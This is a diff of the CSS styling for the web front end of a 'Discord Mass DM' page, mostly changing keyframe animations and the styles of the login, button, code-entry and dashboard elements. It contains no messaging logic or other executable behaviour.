@@ -3,57 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Mass DM - ANIMATED ULTIMATE</title>
+    <title>Discord Mass DM - ULTRA ANIMATED</title>
     
-    <!-- Supabase CDN -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    
-    <!-- Font Awesome pour les icônes -->
+    <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        /* ==================== IMPORT POLICES ==================== */
+        /* ==================== POLICES ==================== */
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap');
         @import url('https://fonts.googleapis.com/css2?family=Righteous&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
         
-        /* ==================== RESET CSS ==================== */
+        /* ==================== RESET ==================== */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        html {
-            font-size: 16px;
-            scroll-behavior: smooth;
-        }
-
         body {
             font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at 0% 0%, #1a1f35, #0a0c15);
-            color: #ffffff;
+            background: linear-gradient(135deg, #0a0c15 0%, #1a1f35 50%, #0a0c15 100%);
+            color: #fff;
             min-height: 100vh;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
         }
 
-        /* ==================== ANIMATIONS ==================== */
+        /* ==================== ANIMATIONS ULTRA ==================== */
         @keyframes float {
             0%, 100% { transform: translateY(0) rotate(0deg); }
-            25% { transform: translateY(-20px) rotate(5deg); }
-            75% { transform: translateY(20px) rotate(-5deg); }
+            25% { transform: translateY(-20px) rotate(2deg); }
+            75% { transform: translateY(20px) rotate(-2deg); }
         }
 
         @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.05); opacity: 0.8; }
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.05); }
         }
 
         @keyframes glow {
-            0%, 100% { box-shadow: 0 0 30px rgba(88, 101, 242, 0.5); }
-            50% { box-shadow: 0 0 60px rgba(168, 85, 247, 0.8); }
+            0%, 100% { box-shadow: 0 0 20px rgba(88, 101, 242, 0.3); }
+            50% { box-shadow: 0 0 60px rgba(88, 101, 242, 0.8); }
         }
 
         @keyframes spin {
@@ -62,23 +55,23 @@
         }
 
         @keyframes slideInLeft {
-            from { transform: translateX(-100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+            from { transform: translateX(-100%) scale(0.5); opacity: 0; }
+            to { transform: translateX(0) scale(1); opacity: 1; }
         }
 
         @keyframes slideInRight {
-            from { transform: translateX(100%); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
+            from { transform: translateX(100%) scale(0.5); opacity: 0; }
+            to { transform: translateX(0) scale(1); opacity: 1; }
         }
 
         @keyframes slideInUp {
-            from { transform: translateY(100%); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+            from { transform: translateY(100%) scale(0.5); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
         @keyframes slideInDown {
-            from { transform: translateY(-100%); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+            from { transform: translateY(-100%) scale(0.5); opacity: 0; }
+            to { transform: translateY(0) scale(1); opacity: 1; }
         }
 
         @keyframes scaleIn {
@@ -87,51 +80,51 @@
         }
 
         @keyframes rotateIn {
-            from { transform: rotate(-180deg) scale(0); opacity: 0; }
+            from { transform: rotate(-720deg) scale(0); opacity: 0; }
             to { transform: rotate(0) scale(1); opacity: 1; }
         }
 
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+            50% { transform: translateY(-30px); }
         }
 
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-            20%, 40%, 60%, 80% { transform: translateX(5px); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
         }
 
         @keyframes wave {
             0% { transform: rotate(0deg); }
-            10% { transform: rotate(14deg); }
-            20% { transform: rotate(-8deg); }
-            30% { transform: rotate(14deg); }
-            40% { transform: rotate(-4deg); }
-            50% { transform: rotate(10deg); }
+            10% { transform: rotate(20deg); }
+            20% { transform: rotate(-10deg); }
+            30% { transform: rotate(20deg); }
+            40% { transform: rotate(-5deg); }
+            50% { transform: rotate(15deg); }
             60% { transform: rotate(0deg); }
         }
 
         @keyframes heartbeat {
             0% { transform: scale(1); }
-            14% { transform: scale(1.3); }
+            14% { transform: scale(1.5); }
             28% { transform: scale(1); }
-            42% { transform: scale(1.3); }
+            42% { transform: scale(1.5); }
             70% { transform: scale(1); }
         }
 
         @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
+            0% { transform: translate(0); text-shadow: 0 0 0 #5865f2; }
+            20% { transform: translate(-3px, 3px); text-shadow: 2px 0 0 #ef4444, -2px 0 0 #22c55e; }
+            40% { transform: translate(-3px, -3px); text-shadow: 2px 0 0 #22c55e, -2px 0 0 #ef4444; }
+            60% { transform: translate(3px, 3px); text-shadow: -2px 0 0 #5865f2, 2px 0 0 #a855f7; }
+            80% { transform: translate(3px, -3px); text-shadow: -2px 0 0 #a855f7, 2px 0 0 #5865f2; }
+            100% { transform: translate(0); text-shadow: 0 0 0 #5865f2; }
         }
 
         @keyframes neon {
-            0%, 100% { text-shadow: 0 0 10px #5865f2, 0 0 20px #5865f2, 0 0 30px #5865f2; }
-            50% { text-shadow: 0 0 20px #a855f7, 0 0 40px #a855f7, 0 0 60px #a855f7; }
+            0%, 100% { text-shadow: 0 0 10px #5865f2, 0 0 20px #5865f2, 0 0 30px #5865f2, 0 0 40px #5865f2; }
+            50% { text-shadow: 0 0 20px #a855f7, 0 0 40px #a855f7, 0 0 60px #a855f7, 0 0 80px #a855f7; }
         }
 
         @keyframes rainbow {
@@ -145,7 +138,7 @@
             to { width: 100%; }
         }
 
-        @keyframes blink-caret {
+        @keyframes blink {
             from, to { border-color: transparent; }
             50% { border-color: #5865f2; }
         }
@@ -155,112 +148,101 @@
             to { background-position: 100% 100%; }
         }
 
+        @keyframes flip {
+            0% { transform: perspective(400px) rotateY(0); }
+            100% { transform: perspective(400px) rotateY(360deg); }
+        }
+
+        @keyframes swing {
+            20% { transform: rotate(20deg); }
+            40% { transform: rotate(-15deg); }
+            60% { transform: rotate(10deg); }
+            80% { transform: rotate(-5deg); }
+            100% { transform: rotate(0deg); }
+        }
+
+        @keyframes wobble {
+            0% { transform: translateX(0%); }
+            15% { transform: translateX(-30%) rotate(-10deg); }
+            30% { transform: translateX(25%) rotate(8deg); }
+            45% { transform: translateX(-20%) rotate(-6deg); }
+            60% { transform: translateX(15%) rotate(4deg); }
+            75% { transform: translateX(-10%) rotate(-2deg); }
+            100% { transform: translateX(0%); }
+        }
+
+        @keyframes jello {
+            0%, 100% { transform: scale(1, 1); }
+            30% { transform: scale(1.35, 0.65); }
+            40% { transform: scale(0.75, 1.35); }
+            50% { transform: scale(1.25, 0.75); }
+            65% { transform: scale(0.9, 1.15); }
+            75% { transform: scale(1.15, 0.9); }
+        }
+
+        @keyframes rubberBand {
+            0% { transform: scale(1); }
+            30% { transform: scaleX(1.35) scaleY(0.65); }
+            40% { transform: scaleX(0.75) scaleY(1.35); }
+            60% { transform: scaleX(1.2) scaleY(0.8); }
+            100% { transform: scale(1); }
+        }
+
+        @keyframes tada {
+            0% { transform: scale(1); }
+            10%, 20% { transform: scale(0.9) rotate(-5deg); }
+            30%, 50%, 70%, 90% { transform: scale(1.2) rotate(5deg); }
+            40%, 60%, 80% { transform: scale(1.2) rotate(-5deg); }
+            100% { transform: scale(1) rotate(0); }
+        }
+
+        @keyframes lightSpeedIn {
+            from { transform: translateX(100%) skewX(-30deg); opacity: 0; }
+            60% { transform: skewX(20deg); opacity: 1; }
+            80% { transform: skewX(-5deg); }
+            to { transform: translateX(0) skewX(0); }
+        }
+
+        @keyframes rollIn {
+            from { transform: translateX(-100%) rotate(-720deg); opacity: 0; }
+            to { transform: translateX(0) rotate(0); opacity: 1; }
+        }
+
         /* ==================== ANIMATION CLASSES ==================== */
-        .animate-float {
-            animation: float 6s ease-in-out infinite;
-        }
+        .animate-float { animation: float 8s ease-in-out infinite; }
+        .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+        .animate-glow { animation: glow 3s ease-in-out infinite; }
+        .animate-spin { animation: spin 1s linear infinite; }
+        .animate-spin-slow { animation: spin 3s linear infinite; }
+        .animate-spin-very-slow { animation: spin 6s linear infinite; }
+        .animate-slide-left { animation: slideInLeft 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-slide-right { animation: slideInRight 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-slide-up { animation: slideInUp 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-slide-down { animation: slideInDown 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-scale { animation: scaleIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-rotate { animation: rotateIn 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+        .animate-bounce { animation: bounce 2s ease-in-out infinite; }
+        .animate-shake { animation: shake 0.5s ease-in-out; }
+        .animate-wave { animation: wave 2.5s ease-in-out infinite; transform-origin: 70% 70%; }
+        .animate-heartbeat { animation: heartbeat 1.5s ease-in-out infinite; }
+        .animate-glitch { animation: glitch 0.3s ease-in-out infinite; }
+        .animate-neon { animation: neon 2s ease-in-out infinite; }
+        .animate-flip { animation: flip 2s ease-in-out infinite; }
+        .animate-swing { animation: swing 1s ease-in-out infinite; transform-origin: top center; }
+        .animate-wobble { animation: wobble 1s ease-in-out infinite; }
+        .animate-jello { animation: jello 1s ease-in-out infinite; transform-origin: center; }
+        .animate-rubber-band { animation: rubberBand 1s ease-in-out infinite; }
+        .animate-tada { animation: tada 1s ease-in-out infinite; }
+        .animate-light-speed { animation: lightSpeedIn 1s ease-out; }
+        .animate-roll { animation: rollIn 1s ease-out; }
 
-        .animate-pulse {
-            animation: pulse 2s ease-in-out infinite;
-        }
-
-        .animate-glow {
-            animation: glow 3s ease-in-out infinite;
-        }
-
-        .animate-spin {
-            animation: spin 1s linear infinite;
-        }
-
-        .animate-spin-slow {
-            animation: spin 3s linear infinite;
-        }
-
-        .animate-slide-left {
-            animation: slideInLeft 0.6s ease-out;
-        }
-
-        .animate-slide-right {
-            animation: slideInRight 0.6s ease-out;
-        }
-
-        .animate-slide-up {
-            animation: slideInUp 0.6s ease-out;
-        }
-
-        .animate-slide-down {
-            animation: slideInDown 0.6s ease-out;
-        }
-
-        .animate-scale {
-            animation: scaleIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-        }
-
-        .animate-rotate {
-            animation: rotateIn 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-        }
-
-        .animate-bounce {
-            animation: bounce 2s ease-in-out infinite;
-        }
-
-        .animate-shake {
-            animation: shake 0.5s ease-in-out;
-        }
-
-        .animate-wave {
-            animation: wave 2.5s ease-in-out infinite;
-        }
-
-        .animate-heartbeat {
-            animation: heartbeat 1.5s ease-in-out infinite;
-        }
-
-        .animate-glitch {
-            animation: glitch 0.3s ease-in-out infinite;
-        }
-
-        .animate-neon {
-            animation: neon 2s ease-in-out infinite;
-        }
-
-        .animate-typing {
-            overflow: hidden;
-            white-space: nowrap;
-            border-right: 2px solid #5865f2;
-            animation: typing 3s steps(40, end), blink-caret 0.75s step-end infinite;
-        }
-
-        /* ==================== LOADER ==================== */
-        .loader {
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top-color: #5865f2;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-        }
-
-        .loader-sm {
-            width: 18px;
-            height: 18px;
-            border-width: 2px;
-        }
-
-        .loader-lg {
-            width: 36px;
-            height: 36px;
-            border-width: 4px;
-        }
-
-        /* ==================== CONTAINER ==================== */
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 1;
-        }
+        /* Délais */
+        .delay-100 { animation-delay: 100ms; }
+        .delay-200 { animation-delay: 200ms; }
+        .delay-300 { animation-delay: 300ms; }
+        .delay-500 { animation-delay: 500ms; }
+        .delay-700 { animation-delay: 700ms; }
+        .delay-1000 { animation-delay: 1000ms; }
 
         /* ==================== BACKGROUND ANIMÉ ==================== */
         .animated-bg {
@@ -275,60 +257,89 @@
 
         .animated-bg span {
             position: absolute;
-            background: rgba(88, 101, 242, 0.1);
+            background: rgba(88, 101, 242, 0.05);
             animation: float 20s infinite linear;
-            pointer-events: none;
         }
 
         .animated-bg span:nth-child(1) {
-            width: 80px;
-            height: 80px;
+            width: 150px;
+            height: 150px;
             top: 20%;
             left: 10%;
             border-radius: 50%;
-            animation-delay: 0s;
+            background: rgba(88, 101, 242, 0.05);
+            animation: spin 10s linear infinite;
         }
 
         .animated-bg span:nth-child(2) {
-            width: 60px;
-            height: 60px;
+            width: 100px;
+            height: 100px;
             top: 60%;
             right: 15%;
             border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
-            animation-delay: 2s;
-            background: rgba(168, 85, 247, 0.1);
+            background: rgba(168, 85, 247, 0.05);
+            animation: spin 15s linear infinite reverse;
         }
 
         .animated-bg span:nth-child(3) {
-            width: 100px;
-            height: 100px;
+            width: 200px;
+            height: 200px;
             bottom: 10%;
             left: 20%;
             border-radius: 40% 60% 60% 40% / 40% 50% 50% 60%;
-            animation-delay: 4s;
-            background: rgba(34, 197, 94, 0.1);
+            background: rgba(34, 197, 94, 0.05);
+            animation: spin 20s linear infinite;
         }
 
         .animated-bg span:nth-child(4) {
-            width: 40px;
-            height: 40px;
+            width: 80px;
+            height: 80px;
             top: 30%;
             right: 30%;
             border-radius: 50%;
-            animation-delay: 1s;
+            background: rgba(239, 68, 68, 0.05);
+            animation: spin 12s linear infinite reverse;
         }
 
         .animated-bg span:nth-child(5) {
-            width: 120px;
-            height: 120px;
+            width: 250px;
+            height: 250px;
             bottom: 30%;
             right: 40%;
             border-radius: 60% 40% 40% 60% / 60% 40% 60% 40%;
-            animation-delay: 3s;
-            background: rgba(239, 68, 68, 0.1);
+            background: rgba(255, 193, 7, 0.05);
+            animation: spin 18s linear infinite;
         }
 
-        /* ==================== LOGIN SCREEN ==================== */
+        .animated-bg span:nth-child(6) {
+            width: 120px;
+            height: 120px;
+            top: 40%;
+            left: 40%;
+            border-radius: 50%;
+            background: rgba(88, 101, 242, 0.05);
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        .animated-bg span:nth-child(7) {
+            width: 180px;
+            height: 180px;
+            bottom: 40%;
+            left: 60%;
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            background: rgba(168, 85, 247, 0.05);
+            animation: bounce 4s ease-in-out infinite;
+        }
+
+        /* ==================== CONTAINER ==================== */
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1000;
+        }
+
+        /* ==================== LOGIN SCREEN - 100% FONCTIONNEL ==================== */
         .login-screen {
             min-height: 100vh;
             display: flex;
@@ -338,23 +349,19 @@
         }
 
         .login-card {
-            width: 100%;
-            max-width: 550px;
-            background: rgba(18, 22, 36, 0.9);
+            background: rgba(26, 29, 43, 0.98);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50px;
-            padding: 50px 40px;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.5);
-            animation: scaleIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
-            transition: all 0.3s;
+            border: 2px solid rgba(255, 255, 255, 0.15);
+            border-radius: 60px;
+            padding: 50px;
+            width: 100%;
+            max-width: 500px;
+            animation: scaleIn 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55), glow 4s ease-in-out infinite;
             position: relative;
             overflow: hidden;
-        }
-
-        .login-card:hover {
-            border-color: #5865f2;
-            box-shadow: 0 0 50px rgba(88, 101, 242, 0.3);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            cursor: pointer;
         }
 
         .login-card::before {
@@ -364,58 +371,201 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: conic-gradient(transparent, #5865f2, transparent, #a855f7, transparent);
-            animation: spin 10s linear infinite;
+            background: conic-gradient(transparent, #5865f2, transparent, #a855f7, transparent, #22c55e, transparent);
+            animation: spin 8s linear infinite;
             opacity: 0.2;
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 40px;
-            position: relative;
-            z-index: 1;
+            z-index: -1;
         }
 
         .login-logo {
             width: 120px;
             height: 120px;
-            margin: 0 auto 25px;
-            background: linear-gradient(135deg, #5865f2, #a855f7);
+            background: linear-gradient(135deg, #5865f2, #a855f7, #22c55e, #ef4444);
             border-radius: 40px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 60px;
-            animation: pulse 3s ease-in-out infinite, glow 3s ease-in-out infinite;
-            box-shadow: 0 0 30px rgba(88, 101, 242, 0.5);
+            margin: 0 auto 20px;
+            animation: bounce 3s ease-in-out infinite, spin-very-slow 10s linear infinite;
+            box-shadow: 0 0 50px rgba(88, 101, 242, 0.5);
+            background-size: 300% 300%;
+            animation: bounce 3s ease-in-out infinite, rainbow 6s ease infinite, spin-very-slow 10s linear infinite;
         }
 
         .login-title {
             font-size: 42px;
             font-weight: 800;
-            background: linear-gradient(135deg, #fff, #5865f2, #a855f7);
-            background-size: 200% 200%;
+            text-align: center;
+            background: linear-gradient(135deg, #fff, #5865f2, #a855f7, #22c55e);
+            background-size: 300% 300%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
-            animation: rainbow 6s ease infinite;
+            animation: neon 3s ease-in-out infinite, rainbow 6s ease infinite;
         }
 
         .login-subtitle {
+            text-align: center;
             color: #9fa6c2;
-            font-size: 18px;
+            margin-bottom: 30px;
+            font-size: 16px;
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        /* ==================== INPUTS - 100% CLIQUABLES ==================== */
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+            z-index: 2000;
+        }
+
+        .input-group input,
+        .input-group select,
+        .input-group textarea {
+            width: 100%;
+            padding: 18px 25px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 2000;
+            cursor: text;
+        }
+
+        .input-group input:hover,
+        .input-group select:hover,
+        .input-group textarea:hover {
+            border-color: rgba(88, 101, 242, 0.5);
+            transform: scale(1.02);
+        }
+
+        .input-group input:focus,
+        .input-group select:focus,
+        .input-group textarea:focus {
+            outline: none;
+            border-color: #5865f2;
+            box-shadow: 0 0 50px rgba(88, 101, 242, 0.5);
+            transform: scale(1.05);
+            background: rgba(0, 0, 0, 0.8);
+        }
+
+        .input-group textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+
+        /* ==================== BUTTONS - 100% CLIQUABLES ==================== */
+        .btn {
+            padding: 18px 30px;
+            border: none;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+            z-index: 2000;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.8s, height 0.8s;
+            z-index: -1;
+        }
+
+        .btn:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #5865f2, #4f46e5);
+            color: white;
+            width: 100%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(88, 101, 242, 0.6);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #22c55e, #16a34a);
+            color: white;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(34, 197, 94, 0.6);
+        }
+
+        .btn-error {
+            background: linear-gradient(135deg, #ef4444, #dc2626);
+            color: white;
+        }
+
+        .btn-error:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(239, 68, 68, 0.6);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            color: white;
+        }
+
+        .btn-outline:hover {
+            border-color: #5865f2;
+            color: #5865f2;
+            transform: translateY(-5px) scale(1.02);
+        }
+
+        .btn-premium {
+            background: linear-gradient(135deg, #a855f7, #9333ea);
+            color: white;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
         }
 
         /* ==================== CODE SECTION ==================== */
         .code-section {
             background: linear-gradient(135deg, rgba(168, 85, 247, 0.3), rgba(88, 101, 242, 0.3));
-            border: 2px solid #a855f7;
-            border-radius: 40px;
+            border: 3px solid #a855f7;
+            border-radius: 50px;
             padding: 30px;
-            margin-bottom: 30px;
-            animation: pulse 4s ease-in-out infinite, glow 4s ease-in-out infinite;
+            margin: 30px 0 20px;
+            animation: pulse 3s ease-in-out infinite, glow 4s ease-in-out infinite;
             position: relative;
             overflow: hidden;
+            z-index: 2000;
         }
 
         .code-section::before {
@@ -425,7 +575,7 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: conic-gradient(transparent, #a855f7, transparent);
+            background: conic-gradient(transparent, #a855f7, transparent, #5865f2, transparent);
             animation: spin 8s linear infinite;
             opacity: 0.3;
         }
@@ -438,41 +588,31 @@
             align-items: center;
             justify-content: center;
             gap: 15px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .code-title span:first-child,
-        .code-title span:last-child {
             animation: bounce 2s ease-in-out infinite;
-            font-size: 32px;
         }
 
         .code-input-group {
             display: flex;
             gap: 15px;
             position: relative;
-            z-index: 1;
+            z-index: 2000;
         }
 
         .code-input-group input {
             flex: 1;
             padding: 18px 20px;
-            background: rgba(0, 0, 0, 0.4);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 30px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 3px solid rgba(255, 255, 255, 0.15);
+            border-radius: 50px;
             color: white;
             font-size: 18px;
             text-transform: uppercase;
             letter-spacing: 4px;
-            transition: all 0.3s;
         }
 
         .code-input-group input:focus {
             outline: none;
             border-color: #a855f7;
-            box-shadow: 0 0 30px rgba(168, 85, 247, 0.5);
-            transform: scale(1.02);
         }
 
         .code-input-group button {
@@ -480,194 +620,37 @@
             background: linear-gradient(135deg, #a855f7, #9333ea);
             color: white;
             border: none;
-            border-radius: 30px;
+            border-radius: 50px;
             font-weight: 700;
-            font-size: 16px;
             cursor: pointer;
-            transition: all 0.3s;
             white-space: nowrap;
             animation: pulse 2s ease-in-out infinite;
         }
 
         .code-input-group button:hover {
-            transform: translateY(-3px) scale(1.05);
-            box-shadow: 0 15px 40px rgba(168, 85, 247, 0.6);
-        }
-
-        .code-input-group button:active {
-            transform: translateY(0) scale(0.95);
-        }
-
-        /* ==================== INPUT GROUP ==================== */
-        .input-group {
-            margin-bottom: 25px;
-            animation: slideInLeft 0.6s ease-out;
-            animation-fill-mode: both;
-        }
-
-        .input-group:nth-child(2) { animation-delay: 0.1s; }
-        .input-group:nth-child(3) { animation-delay: 0.2s; }
-
-        .input-label {
-            display: block;
-            margin-bottom: 8px;
-            color: #9fa6c2;
-            font-size: 14px;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 18px 20px;
-            background: #1e2230;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 25px;
-            color: white;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-
-        .input-field:focus {
-            outline: none;
-            border-color: #5865f2;
-            box-shadow: 0 0 30px rgba(88, 101, 242, 0.4);
-            transform: scale(1.02);
-        }
-
-        /* ==================== BUTTONS ==================== */
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            padding: 18px 30px;
-            border: none;
-            border-radius: 35px;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            transition: all 0.3s;
-            width: 100%;
-            margin: 5px 0;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
-
-        .btn:hover::before {
-            width: 300px;
-            height: 300px;
-        }
-
-        .btn:active {
-            transform: scale(0.95);
-        }
-
-        .btn-primary {
-            background: linear-gradient(135deg, #5865f2, #4f46e5);
-            color: white;
-            box-shadow: 0 4px 20px rgba(88, 101, 242, 0.4);
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 40px rgba(88, 101, 242, 0.6);
-        }
-
-        .btn-success {
-            background: linear-gradient(135deg, #22c55e, #16a34a);
-            color: white;
-            box-shadow: 0 4px 20px rgba(34, 197, 94, 0.4);
-        }
-
-        .btn-success:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 40px rgba(34, 197, 94, 0.6);
-        }
-
-        .btn-error {
-            background: linear-gradient(135deg, #ef4444, #dc2626);
-            color: white;
-            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4);
-        }
-
-        .btn-error:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 40px rgba(239, 68, 68, 0.6);
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            color: white;
-        }
-
-        .btn-outline:hover {
-            border-color: #5865f2;
-            color: #5865f2;
-            transform: translateY(-3px);
-        }
-
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* ==================== ALERTS ==================== */
-        .alert {
-            padding: 18px;
-            border-radius: 25px;
-            margin: 20px 0;
-            display: none;
-            animation: slideInUp 0.5s ease-out;
-        }
-
-        .alert-error {
-            background: rgba(239, 68, 68, 0.15);
-            border: 1px solid #ef4444;
-            color: #ef4444;
-        }
-
-        .alert-success {
-            background: rgba(34, 197, 94, 0.15);
-            border: 1px solid #22c55e;
-            color: #22c55e;
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 40px rgba(168, 85, 247, 0.6);
         }
 
         /* ==================== DASHBOARD ==================== */
         .dashboard {
-            background: rgba(18, 22, 36, 0.95);
+            background: rgba(26, 29, 43, 0.98);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.15);
             border-radius: 70px;
             padding: 40px;
             animation: scaleIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
         }
 
         /* Header */
         .dashboard-header {
             display: flex;
-            flex-wrap: wrap;
-            gap: 20px;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
             padding-bottom: 20px;
-            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
+            border-bottom: 3px solid rgba(255, 255, 255, 0.1);
             animation: slideInUp 0.6s ease-out;
         }
 
@@ -681,7 +664,7 @@
             width: 80px;
             height: 80px;
             border-radius: 50%;
-            border: 3px solid #5865f2;
+            border: 4px solid #5865f2;
             position: relative;
             animation: pulse 3s ease-in-out infinite;
         }
@@ -697,43 +680,54 @@
             position: absolute;
             bottom: 5px;
             right: 5px;
-            width: 15px;
-            height: 15px;
+            width: 18px;
+            height: 18px;
             background: #22c55e;
             border-radius: 50%;
-            border: 2px solid #12141f;
+            border: 3px solid #1a1d2b;
             animation: pulse 2s ease-in-out infinite;
         }
 
         .user-info h2 {
-            font-size: 28px;
+            font-size: 26px;
             margin-bottom: 5px;
-            background: linear-gradient(135deg, #fff, #5865f2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            animation: neon 3s ease-in-out infinite;
+        }
+
+        .user-badge {
+            padding: 5px 15px;
+            background: rgba(88, 101, 242, 0.2);
+            border-radius: 30px;
+            font-size: 13px;
+            border: 2px solid #5865f2;
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        .user-badge.premium {
+            border-color: #a855f7;
+            background: rgba(168, 85, 247, 0.2);
         }
 
         .header-actions {
             display: flex;
             gap: 15px;
